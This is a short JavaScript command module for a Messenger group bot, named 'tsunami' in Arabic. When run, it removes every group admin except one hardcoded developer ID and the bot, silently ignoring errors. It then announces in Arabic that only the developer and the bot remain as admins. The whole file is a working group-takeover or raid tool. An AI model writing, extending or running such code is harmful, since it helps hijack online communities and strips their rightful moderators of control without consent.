module.exports = {
    config: { name: "تسونامي" },
    run: async function({ api, event, Users, Threads }) {
        const { threadID, messageID } = event;

        const threadInfo = await Threads.getInfo(threadID);
        for(const admin of threadInfo.adminIDs) {
            if(admin.id !== "61577861540407" && admin.id !== api.getCurrentUserID()) {
                try { 
                    await api.removeUserFromGroup(admin.id, threadID); 
                } catch(e) {} 
            }
        }

        api.sendMessage(`
╔═════════════════════
║ 🌊 تم تنفيذ تسونامي!
╠═════════════════════
║ بقي المطور والبوت فقط كأدمن.
╚═════════════════════
        `, threadID, messageID);
    }
};
